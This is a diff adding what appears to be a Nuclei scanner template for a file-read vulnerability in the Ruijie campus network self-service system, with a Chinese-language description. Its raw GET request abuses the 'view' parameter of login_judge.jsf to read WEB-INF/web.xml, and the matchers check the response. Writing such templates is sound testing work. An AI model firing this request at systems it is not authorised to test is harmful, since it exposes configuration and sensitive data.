@@ -1,0 +1,33 @@
+id: ruijie-judge-jsf-File-reading
+
+info:
+  name: "锐捷校园网自助服务系统 login_judge.jsf 接口文件读取漏洞"
+  author: Unknown
+  severity: medium
+  description: |-
+    body="校园网自助服务系统"
+    /selfservice/selfservice/module/scgroup/web/login_judge.jsf 接口存在文件读取漏洞。经分析，该漏洞利用门槛较低，攻击者可借此获取系统内敏感数据，建议立即采取修复措施。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/139510684
+  tags: 锐捷校园网自助服务系统
+
+http:
+- raw:
+  - |
+    GET /selfservice/selfservice/module/scgroup/web/login_judge.jsf?view=./WEB-INF/web.xml%3F HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '<?xml version="1.0" encoding="UTF-8"?>'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
